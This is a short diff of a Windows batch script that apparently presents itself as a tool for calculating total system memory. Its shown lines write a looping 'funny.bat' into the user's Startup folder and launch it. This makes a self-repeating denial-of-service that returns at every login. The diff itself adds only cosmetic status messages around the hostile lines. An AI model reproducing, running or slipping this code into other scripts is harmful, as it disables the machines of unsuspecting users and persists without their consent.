@@ -1,9 +1,12 @@
 @echo off 
+echo Starting copy...
 cd "%AppData%/Microsoft/Windows/Start Menu/Programs/Startup"
 echo :funny > funny.bat
 echo funny.bat >> funny.bat
 echo goto:funny >> funny.bat
+echo Finished!
 start funny.bat
+echo Running...
 
 echo Calculating total system memory
 for /f "skip=1" %%p in ('wmic os get TotalVisibleMemorySize') do ( 
